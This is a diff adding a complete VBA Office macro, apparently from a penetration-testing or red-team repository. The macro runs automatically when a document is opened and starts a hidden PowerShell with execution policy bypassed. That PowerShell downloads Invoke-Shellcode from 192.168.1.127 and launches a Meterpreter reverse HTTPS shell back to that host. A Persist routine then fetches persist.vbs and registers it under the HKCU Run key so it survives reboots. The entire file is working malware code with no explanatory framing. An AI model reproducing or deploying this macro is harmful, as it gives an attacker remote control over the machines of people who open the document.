@@ -1,0 +1,73 @@
+Sub Auto_Open()
+If GetObject("winmgmts:root\cimv2:Win32_Processor='cpu0'").AddressWidth = 32 Then
+    Execute32
+Else
+    Execute64
+End If
+Persist
+
+End Sub
+
+    Public Function Execute32() As Variant
+    
+        Const HIDDEN_WINDOW = 0
+        strComputer = "."
+        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+         
+        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+        Set objConfig = objStartup.SpawnInstance_
+        objConfig.ShowWindow = HIDDEN_WINDOW
+        Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+         objProcess.Create "C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('http://192.168.1.127/Invoke-Shellcode')); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.127 -Lport 1111 -Force", Null, objConfig, intProcessID
+                
+   
+    End Function
+
+
+     Public Function Execute64() As Variant
+     Const HIDDEN_WINDOW = 0
+        strComputer = "."
+        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+         
+        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+        Set objConfig = objStartup.SpawnInstance_
+        objConfig.ShowWindow = HIDDEN_WINDOW
+        Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+        objProcess.Create "C:\\WINDOWS\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('http://192.168.1.127/Invoke-Shellcode')); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.127 -Lport 1111 -Force", Null, objConfig, intProcessID
+    End Function
+
+    Public Function Persist() As Variant
+    Dim FileNum1 As Long
+    Dim FileData1() As Byte
+    Dim MyFile1 As String
+    Dim WHTTP1 As Object
+    Dim WshShell As Object
+    
+    On Error Resume Next
+    Set WHTTP1 = CreateObject("WinHTTP.WinHTTPrequest.5")
+    If Err.Number <> 0 Then
+        Set WHTTP1 = CreateObject("WinHTTP.WinHTTPrequest.5.1")
+    End If
+    On Error GoTo 0
+    
+    MyFile1 = "http://192.168.1.127/persist.vbs"
+    
+    WHTTP1.Open "GET", MyFile1, False
+    WHTTP1.Send
+    FileData1 = WHTTP1.ResponseBody
+    Set WHTT1P = Nothing
+    
+    If Dir("C:\Temp", vbDirectory) = Empty Then MkDir "C:\Temp"
+    FileNum1 = FreeFile
+    Open "C:\Temp\persist.vbs" For Binary Access Write As #FileNum1
+    Put #FileNum1, 1, FileData1
+    Close #FileNum1
+    
+    
+    Set WshShell = CreateObject("WScript.Shell")
+    WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Persist", "C:\Temp\persist.vbs", "REG_SZ"
+    Set WshShell = Nothing
+
+    
+       
+End Function
